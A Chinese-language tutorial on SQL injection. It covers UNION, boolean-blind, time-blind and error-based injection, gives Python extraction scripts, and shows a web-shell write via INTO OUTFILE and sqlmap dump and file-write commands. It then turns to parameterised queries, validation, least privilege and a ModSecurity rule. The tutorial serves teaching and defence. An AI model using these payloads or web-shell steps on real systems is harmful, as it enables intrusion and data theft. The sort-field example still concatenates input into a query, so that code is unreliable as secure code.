# SQL 注入

`1' OR '1'='1`——这条简单的字符串，毁掉了多少系统？

SQL 注入（SQL Injection）是 Web 安全中最古老、危害最大的漏洞之一。直到今天，它仍然是数据泄露的主要原因。攻击者只需要找到一处拼接 SQL 的代码，就能撬开整个数据库。

## SQL 注入原理

### 危险代码示例

```java
// 危险的字符串拼接
String sql = "SELECT * FROM users WHERE name = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// 用户输入: admin' --
String sql = "SELECT * FROM users WHERE name = 'admin' --'";
// -- 后面的内容被当作注释，SQL 变成：
// SELECT * FROM users WHERE name = 'admin'
```

### 攻击的本质

用户输入被当作 SQL 代码的一部分执行，而不是当作「数据」。

```
正常情况：
输入：admin
SQL：SELECT * FROM users WHERE name = 'admin'
结果：查询 name = 'admin' 的用户

被注入后：
输入：admin' OR '1'='1
SQL：SELECT * FROM users WHERE name = 'admin' OR '1'='1'
结果：返回所有用户（因为 1=1 永远为真）
```

## SQL 注入类型

### 1. 联合查询注入（UNION Injection）

用于注入点后有 SELECT 语句，且需要通过 UNION 合并查询结果：

```sql
-- 原始查询
SELECT name, email FROM users WHERE id = '1'

-- 注入后
SELECT name, email FROM users WHERE id = '1' UNION SELECT username, password FROM admin--'

-- 攻击者想要获取管理员密码
```

```java
// 检测注入点
// https://example.com/product?id=1' UNION SELECT ...

// 获取数据库版本
https://example.com/product?id=1' UNION SELECT NULL,@@version--

// 获取所有表名
https://example.com/product?id=1' UNION SELECT NULL,table_name FROM information_schema.tables--

// 获取用户表数据
https://example.com/product?id=1' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
```

### 2. 布尔盲注（Boolean Blind Injection）

当页面不返回 SQL 执行结果，只返回「有内容」或「无内容」两种状态时使用：

```python
import requests

def blind_inject(url, payload_template):
    """布尔盲注演示"""
    result = []

    for i in range(1, 33):  # 假设密码 32 位（MD5）
        for ascii_val in range(32, 127):
            # 猜测密码的第 i 个字符
            payload = payload_template.format(
                char=chr(ascii_val),
                pos=i
            )

            resp = requests.get(url, params={'id': payload})
            # 根据页面内容判断猜测是否正确
            if 'Product Found' in resp.text:
                result.append(chr(ascii_val))
                print(f"Position {i}: {chr(ascii_val)}")
                break

    return ''.join(result)

# 攻击 payload：当前字符等于猜测值时，页面显示正常
# id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)='{char}
```

### 3. 时间盲注（Time-based Blind Injection）

当布尔盲注也无法判断时，使用时间延迟：

```sql
-- MySQL 时间盲注
1' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)-- 

-- 如果猜对了，页面延迟 5 秒返回
```

```python
import time

def time_blind_inject(url):
    """时间盲注演示"""
    result = []
    for i in range(1, 33):
        for ascii_val in range(32, 127):
            payload = f"1' AND IF(SUBSTRING(password,{i},1)='{chr(ascii_val)}',SLEEP(3),0)-- "

            start = time.time()
            resp = requests.get(url, params={'id': payload})
            elapsed = time.time() - start

            if elapsed > 2:
                result.append(chr(ascii_val))
                break

    return ''.join(result)
```

### 4. 报错注入（Error-based Injection）

利用数据库错误信息获取数据：

```sql
-- MySQL 报错注入
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--
-- 错误信息中包含查询结果
```

## SQL 注入实战技巧

### 信息收集

```sql
-- MySQL 获取版本、用户、数据库名
SELECT VERSION();
SELECT USER();
SELECT DATABASE();

-- 获取所有数据库
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;

-- 获取当前数据库所有表
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE();

-- 获取列名
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users';
```

### 写入 WebShell

```sql
-- MySQL into outfile 写文件
1' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--
```

### OUTFILE vs DUMPFILE

| 特性 | INTO OUTFILE | INTO DUMPFILE |
|---|---|---|
| 写入内容 | 文本，带引号包裹 | 原始二进制 |
| 多行支持 | 是 | 否 |
| 适用场景 | 文本文件 | 二进制文件（图片、WebShell） |

## SQL 注入防御

### 1. 参数化查询（最佳方案）

**JDBC 参数化查询：**

```java
// 正确的做法：使用 PreparedStatement
String sql = "SELECT * FROM users WHERE id = ? AND name = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, userId);   // 参数自动转义
stmt.setString(2, username);
ResultSet rs = stmt.executeQuery();

// 动态表名/列名需要白名单验证
public User findByField(String table, String column, String value) {
    // 白名单验证
    if (!isAllowedTable(table) || !isAllowedColumn(column)) {
        throw new IllegalArgumentException("Invalid table or column");
    }

    // 参数化查询仍然适用
    String sql = String.format("SELECT * FROM %s WHERE %s = ?", table, column);
    PreparedStatement stmt = connection.prepareStatement(sql);
    stmt.setString(1, value);
    // ...
}
```

**MyBatis 参数化查询：**

```xml
<!-- 正确的写法：#{} 会使用参数化查询 -->
<select id="findUser" resultType="User">
    SELECT * FROM users WHERE name = #{name}
</select>

<!-- 错误的写法：${} 会直接拼接字符串 -->
<select id="findUser" resultType="User">
    SELECT * FROM users WHERE name = '${name}'  <!-- 危险！ -->
</select>
```

```java
// MyBatis 动态 SQL - 正确用法
@Select("SELECT * FROM users WHERE id = #{id}")
User findById(@Param("id") Long id);

// 使用 <script> 标签限制参数类型
@Select("<script>SELECT * FROM users WHERE id = #{id}</script>")
User findById(@Param("id") Long id);
```

**Hibernate 参数化查询：**

```java
// JPQL 参数化查询
@Query("SELECT u FROM User u WHERE u.name = :name")
User findByName(@Param("name") String name);

// 原生 SQL 参数化查询
@Query(value = "SELECT * FROM users WHERE name = :name", nativeQuery = true)
User findByNameNative(@Param("name") String name);
```

### 2. 输入验证

```java
// 白名单验证
public static final Pattern ID_PATTERN = Pattern.compile("^[0-9]+$");

public String getUserById(String id) {
    if (!ID_PATTERN.matcher(id).matches()) {
        throw new IllegalArgumentException("Invalid ID format");
    }
    // 使用参数化查询
    return userRepository.findById(Long.parseLong(id));
}

// 枚举限制
public enum SortField {
    NAME, CREATED_AT, UPDATED_AT;

    public static boolean isValid(String field) {
        return Arrays.stream(values())
            .anyMatch(e -> e.name().equals(field));
    }
}

@Query("SELECT u FROM User u ORDER BY u." + sortField + " ASC")
List<User> findAllSorted(@Param("sortField") String sortField);
```

### 3. 最小权限原则

```sql
-- 应用账号只授予必要的权限
GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'app_user'@'localhost';

-- 不授予 DROP、DELETE 等危险权限
-- 不授予 FILE 权限（防止 INTO OUTFILE）
-- 不授予 PROCESS 权限（防止查看其他连接）
```

### 4. 错误信息处理

```java
// 生产环境不要暴露数据库错误
try {
    // 数据库操作
} catch (SQLException e) {
    // 日志记录
    logger.error("Database error", e);

    // 用户看到友好的错误信息
    throw new ApplicationException("系统繁忙，请稍后再试");
}

// Spring Boot 配置
spring:
  datasource:
    hikari:
      connection-init-sql: SET sql_mode='STRICT_TRANS_TABLES'
```

### 5. Web 应用防火墙（WAF）

```nginx
# Nginx + ModSecurity WAF 规则
SecRule REQUEST_URI|ARGS|ARGS_NAMES|REQUEST_HEADERS "@rx (\')|(\")|(\-\-)|(\;)|(\()|(\))|(\{)|(\})|(xp_)|(exec\s)"
    "id:1001,deny,status:403,msg:'SQL Injection Attempt'"
```

## SQL 注入检测工具

### SQLMap 使用

```bash
# 基本扫描
sqlmap -u "https://example.com/product?id=1"

# 指定数据库类型
sqlmap -u "https://example.com/product?id=1" --dbms=mysql

# 获取数据库
sqlmap -u "https://example.com/product?id=1" --dbs

# 获取表名
sqlmap -u "https://example.com/product?id=1" -D mydb --tables

# 获取数据
sqlmap -u "https://example.com/product?id=1" -D mydb -T users --dump

# 写入文件（需要 FILE 权限）
sqlmap -u "https://example.com/product?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```
